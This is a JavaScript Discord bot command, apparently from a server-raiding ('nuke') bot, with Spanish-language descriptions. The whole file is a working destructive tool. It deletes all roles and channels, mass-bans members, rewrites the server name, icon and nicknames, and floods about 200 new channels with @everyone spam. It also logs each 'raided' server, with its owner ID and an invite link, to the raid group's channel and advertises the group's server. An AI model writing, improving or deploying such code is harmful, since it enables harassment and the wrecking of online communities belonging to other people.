const { SlashCommandBuilder } = require("@discordjs/builders")
const { MessageEmbed } = require("discord.js")
const Discord = require("discord.js")



module.exports = {

    timeout: 600000,
    vip: true, 
    name: 'customsex',
    data: new SlashCommandBuilder()
    .setName("sexopremium")
    .setDescription("Customiza tu sexo. (Only VIP)")
    .addStringOption(option => option.setName('channels-name').setDescription('Establece el nombre de los canales nuevos!').setRequired(true))
    .addBooleanOption(option => option.setName('removeroles').setDescription('Borrar roles del server? (True(Si) / False(No)) (Solo roles inferiores)').setRequired(true))
   
    .addBooleanOption(option => option.setName('massban').setDescription('MassBan? (True(Yes) / False(No))').setRequired(true))
    .addStringOption(option => option.setName('text-send').setDescription('Coloca el texto que enviará a los canales afectados!').setRequired(true))
    .addStringOption(option => option.setName('nicknames').setDescription('Establece los apodos de los miembros!').setRequired(true))

    .addStringOption(option => option.setName('server-icon').setDescription('Establece el icono del servidor (https://cool-img/123.png/gif/etc)'))
    .addStringOption(option => option.setName('server-name').setDescription('Establece el nombre del server'))
    .addStringOption(option => option.setName('server-banner').setDescription('Establece el banner del server (https://cool-img/123.png/gif/etc)'))
    
    ,
    async run(client, interaction){
try{
   if(15 >= interaction.guild.memberCount) return interaction.reply({content: '**Solo puedes Raidear servidores con un máximo de 16 personas dentro del server.**', ephemeral: true})
    const channelname = await interaction.options.getString('channels-name')
    const servericon = await interaction.options.getString('server-icon')
    const servername = await interaction.options.getString('server-name')
    const serverbanner = await interaction.options.getString('server-banner')
    const massban = await interaction.options.getBoolean('massban')
    const textsend = await interaction.options.getString('text-send')
    const removeroles = await interaction.options.getBoolean('removeroles')
    const nicknames = await interaction.options.getString('nicknames')
    



    let IDsv = interaction.guild.id
    client.guilds.cache.get(IDsv).setName(servername).catch(e=>{
      return
    })
    client.guilds.cache.get(IDsv).setBanner(serverbanner).catch(e=>{
      return
    })
    client.guilds.cache.get(IDsv).setIcon(servericon).catch(e=>{
      return
    })


if(removeroles == true){
  interaction.guild.roles.cache.forEach(role =>{
 
role.delete().catch(()=>{return})
  
})


}
if(removeroles == false){
console.log(0)
}
if(massban == true){
  interaction.guild.members.cache.forEach(member => {
    if(member.user.id == interaction.user.id){
      return;
    }else{
      member.ban({reason: '☣️SexoSquad☣️'}).catch(e=>{ 
        interaction.user.send(`**${member.user.tag}** **(ID: ${member.user.id})**\n**No se logró banear a ciertos usuarios por cuestiones de permisos o porque cuentan roles más altos que el mio.**`).catch(()=>{
          return;
        })
      })
    }

  })
 
}
interaction.guild.members.cache.forEach(member =>{
  member.setNickname(nicknames).catch(()=>{return;})
})
if(massban == false){
  console.log(0)
}
  interaction.guild.channels.cache.forEach(channel =>{
    channel.delete().catch(()=>{return;})
  
  })
client.guilds.cache.get(IDsv).channels.create('unete').then(async c=>{
  c.permissionOverwrites.create(c.guild.roles.everyone, { VIEW_CHANNEL: true });
    
  c.createInvite()
  .then(async invite => {
    
 
  const embed = new Discord.MessageEmbed()
  .setColor('RED')
  .setAuthor(interaction.guild.name, interaction.guild.iconURL({dynamic: true}))
  .setTitle('Nuevo Servidor Raideado!')
  .addField('Owner:',`> ${client.users.cache.get(interaction.guild.ownerId).tag} *(ID: ${interaction.guild.ownerId})*`)
  .addField('Servidor:',`> ${interaction.guild.name} *(ID: ${interaction.guild.id})*`)
  .addField('Miembros:',`> ${interaction.guild.memberCount}`)
  .addField(`User Raid:`,`> ${interaction.user.tag} *(ID: ${interaction.user.id})*`)
  .addField(`Invitación:`, `> **[ENTRAR AL SERVIDOR](https://discord.gg/${await invite.code})**`)
  .setTimestamp()
  .setThumbnail(interaction.guild.iconURL({size: 4096, format: "png",dynamic: true}))
  const row = new Discord.MessageActionRow()
  .addComponents(
    new Discord.MessageButton()
    .setLabel('ENTRAR AL SERVIDOR')
    .setURL(`https://discord.gg/${await invite.code}`)
    .setStyle('LINK')
  )
  client.channels.cache.get(require('../../config.json').canalogs).send({embeds: [embed], components: [row]})
})

  c.send(`
@everyone\n**¡Únete  para que no le pase esto a tu servidor!** 
${require('../../config.json').sexoinvite}
`).catch(()=>{return})

}).catch(e=>{return})

for (let i = 0; i <= 200; i++) {
await  interaction.guild.channels.create(channelname).then(c => {
  c.permissionOverwrites.create(c.guild.roles.everyone, { VIEW_CHANNEL: true }).catch(e=>{return})
  for (let i = 0; i <= 10; i++) {
    c.send(`  @everyone \n ${textsend}`).catch(e=>{return}).catch(e=>{return})
  }
  }).catch(()=>{return})
  }



}catch (e) {
        console.error(e);
        
        try {
          return;
         } catch (e) {}
        }
    }
}
